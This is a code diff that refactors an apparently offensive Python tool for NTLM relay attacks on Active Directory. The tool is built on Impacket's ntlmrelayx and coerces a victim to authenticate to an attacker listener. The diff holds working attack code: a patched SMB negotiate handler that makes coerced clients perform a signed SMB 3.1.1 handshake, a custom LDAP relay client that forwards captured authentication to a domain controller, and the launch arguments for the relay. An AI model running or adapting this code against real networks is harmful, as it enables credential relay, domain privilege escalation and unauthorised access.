@@ -6,10 +6,20 @@ import runpy
 import shutil
 import struct
 import sys
+import sysconfig
 import time
 from struct import unpack
 
+from impacket import ntlm
+from impacket.examples.ntlmrelayx import clients as relay_clients
+from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
+from impacket.examples.ntlmrelayx.clients import ldaprelayclient
 from impacket.examples.utils import parse_target
+from impacket.ldap.ldap import LDAPConnection, get_entry_values
+from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
+from impacket.nt_errors import STATUS_ACCESS_DENIED
+from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
+from pyasn1.codec.ber import decoder, encoder
 
 
 def build_parser():
@@ -38,8 +48,7 @@ def build_parser():
 
     group = parser.add_argument_group("relay listener")
     group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
-                       help="path to ntlmrelayx.py from the pinned Impacket tree "
-                            "(default: search PATH)")
+                       help="path to a specific ntlmrelayx.py to run instead of the installed one")
     group.add_argument("-listen-ip", action="store", metavar="ip address", required=True,
                        help="attacker listener IP the coerced victim connects to")
     group.add_argument("-victim", action="store", metavar="DOMAIN/account",
@@ -58,80 +67,19 @@ def build_parser():
     return parser
 
 
-args = build_parser().parse_args()
-
-# domain/username:password@targetName  (Impacket-style credential + target parsing).
-# Logging/banner are left to ntlmrelayx (run below) to avoid duplicate handlers.
-domain, username, password, address = parse_target(args.target)
-if not username:
-    sys.exit("[-] username is required: domain/username[:password]@host")
-lmhash = nthash = ""
-if args.hashes:
-    lmhash, _, nthash = args.hashes.partition(":")
-if not password and not nthash and not args.no_pass:
-    from getpass import getpass
-    password = getpass("Password:")
-
-# Normalise to the names the rest of the script uses.
-ldap_host = address
-ldap_ip = args.dc_ip or address
-expected_victim = args.victim.replace("/", "\\") if args.victim else None
-
-from impacket import ntlm
-from impacket.examples.ntlmrelayx import clients as relay_clients
-from impacket.examples.ntlmrelayx.clients import ldaprelayclient
-from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
-from impacket.ldap.ldap import LDAPConnection, get_entry_values
-from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode
-from impacket.nt_errors import STATUS_ACCESS_DENIED
-from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
-from pyasn1.codec.ber import decoder, encoder
-
-
-def configure_smb_listener():
-    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the
-    victim performs a signed SMB handshake (closer to real coercion targets)."""
-    from impacket.examples.ntlmrelayx.servers import smbrelayserver
-    from impacket import smb3
-
-    original = smbrelayserver.SMBRelayServer.SmbNegotiate
-
-    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
-        result = original(self, conn_id, smb_server, request, isSMB1)
-        if not result or not result[1]:
-            return result
-        response = result[1][0]["Data"]
-        response["SecurityMode"] = (
-            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
-        )
-        if isSMB1:
-            # Steer the client onto the SMB2 wildcard so it follows up with a
-            # context-bearing SMB2 Negotiate instead of locking to SMB 2.0.2.
-            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
-            response["NegotiateContextCount"] = 0
-            response["NegotiateContextOffset"] = 0
-            return result
-
-        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
-        preauth = struct.pack(
-            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
-        ) + preauth_data
-        response["DialectRevision"] = smb3.SMB2_DIALECT_311
-        response["NegotiateContextCount"] = 1
-        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
-        response["NegotiateContextOffset"] = context_offset
-        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
-        response["NegotiateContextList"] = preauth
-        return result
-
-    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate
-
-
-def resolve_ntlmrelayx():
-    for candidate in (args.ntlmrelayx, shutil.which("ntlmrelayx.py"), shutil.which("ntlmrelayx")):
+def resolve_ntlmrelayx(explicit=None):
+    candidates = (
+        explicit,
+        shutil.which("ntlmrelayx.py"),
+        shutil.which("ntlmrelayx"),
+        # the pinned impacket dependency ships ntlmrelayx.py into this venv's bin dir
+        os.path.join(sysconfig.get_path("scripts"), "ntlmrelayx.py"),
+    )
+    for candidate in candidates:
         if candidate and os.path.isfile(candidate):
             return os.path.abspath(candidate)
-    raise SystemExit("ntlmrelayx.py not found; pass --ntlmrelayx /path/to/ntlmrelayx.py")
+    raise SystemExit("ntlmrelayx.py not found; reinstall the project (uv tool install --force .) "
+                     "or pass -ntlmrelayx /path/to/ntlmrelayx.py")
 
 
 def ldap_message(operation):
@@ -179,6 +127,46 @@ def read_exact(sock, length):
             raise EOFError("connection closed")
         value += chunk
     return value
+
+
+def configure_smb_listener():
+    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the
+    victim performs a signed SMB handshake (closer to real coercion targets)."""
+    from impacket.examples.ntlmrelayx.servers import smbrelayserver
+    from impacket import smb3
+
+    original = smbrelayserver.SMBRelayServer.SmbNegotiate
+
+    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
+        result = original(self, conn_id, smb_server, request, isSMB1)
+
+        if not result or not result[1]:
+            return result
+        response = result[1][0]["Data"]
+        response["SecurityMode"] = (
+            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
+        )
+        if isSMB1:
+            # Steer the client onto the SMB2 wildcard so it follows up with a
+            # context-bearing SMB2 Negotiate instead of locking to SMB 2.0.2.
+            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
+            response["NegotiateContextCount"] = 0
+            response["NegotiateContextOffset"] = 0
+            return result
+
+        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
+        preauth = struct.pack(
+            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
+        ) + preauth_data
+        response["DialectRevision"] = smb3.SMB2_DIALECT_311
+        response["NegotiateContextCount"] = 1
+        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
+        response["NegotiateContextOffset"] = context_offset
+        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
+        response["NegotiateContextList"] = preauth
+        return result
+
+    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate
 
 
 class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
@@ -308,17 +296,44 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         self.session = None
 
 
-relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
-configure_smb_listener()
+def main():
+    global args, domain, username, password, lmhash, nthash
+    global ldap_host, ldap_ip, expected_victim
 
-sys.argv = [
-    "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
-    "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
-    "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
-    "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
-]
-if args.debug:
-    sys.argv.append("-debug")
-if args.ts:
-    sys.argv.append("-ts")
-runpy.run_path(resolve_ntlmrelayx(), run_name="__main__")
+    args = build_parser().parse_args()
+
+    # domain/username:password@targetName  (Impacket-style credential + target parsing).
+    # Logging/banner are left to ntlmrelayx (run below) to avoid duplicate handlers.
+    domain, username, password, address = parse_target(args.target)
+    if not username:
+        sys.exit("[-] username is required: domain/username[:password]@host")
+    lmhash = nthash = ""
+    if args.hashes:
+        lmhash, _, nthash = args.hashes.partition(":")
+    if not password and not nthash and not args.no_pass:
+        from getpass import getpass
+        password = getpass("Password:")
+
+    # Normalise to the names the rest of the script uses.
+    ldap_host = address
+    ldap_ip = args.dc_ip or address
+    expected_victim = args.victim.replace("/", "\\") if args.victim else None
+
+    relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
+    configure_smb_listener()
+
+    sys.argv = [
+        "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
+        "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
+        "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
+        "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
+    ]
+    if args.debug:
+        sys.argv.append("-debug")
+    if args.ts:
+        sys.argv.append("-ts")
+    runpy.run_path(resolve_ntlmrelayx(args.ntlmrelayx), run_name="__main__")
+
+
+if __name__ == "__main__":
+    main()
